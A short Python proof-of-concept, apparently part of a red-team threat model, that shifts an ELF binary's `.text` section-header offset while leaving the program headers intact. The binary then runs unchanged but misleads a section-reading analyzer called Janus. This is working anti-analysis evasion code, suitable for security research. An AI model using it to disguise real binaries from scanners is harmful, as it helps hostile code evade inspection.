#!/usr/bin/env python3
# rt-model EX1 PoC: advance the `.text` section header's file offset by DELTA, leaving every
# program header untouched. The kernel loads only through PT_LOAD, so the tampered binary runs
# exactly the same code; only the section header (which Janus reads) now points elsewhere.
# Usage: ex1_tamper.py SRC DST [DELTA_HEX]
import struct, sys, shutil
src, dst = sys.argv[1], sys.argv[2]
delta = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0x40
shutil.copy(src, dst)  # copy mode too, so the tampered binary stays executable
data = bytearray(open(dst, 'rb').read())
e_shoff = struct.unpack_from('<Q', data, 0x28)[0]
e_shentsize = struct.unpack_from('<H', data, 0x3a)[0]
e_shnum = struct.unpack_from('<H', data, 0x3c)[0]
e_shstrndx = struct.unpack_from('<H', data, 0x3e)[0]
sh = lambda i: e_shoff + i * e_shentsize
st_off = struct.unpack_from('<Q', data, sh(e_shstrndx) + 24)[0]
def nm(off):
    e = data.index(0, st_off + off)
    return data[st_off + off:e].decode()
for i in range(e_shnum):
    o = sh(i)
    name = struct.unpack_from('<I', data, o)[0]
    if nm(name) == '.text':
        cur = struct.unpack_from('<Q', data, o + 24)[0]
        struct.pack_into('<Q', data, o + 24, cur + delta)
        open(dst, 'wb').write(data)
        print(".text sh_offset %#x -> %#x (program headers untouched)" % (cur, cur + delta))
        sys.exit(0)
print("no .text section header", file=sys.stderr)
sys.exit(1)
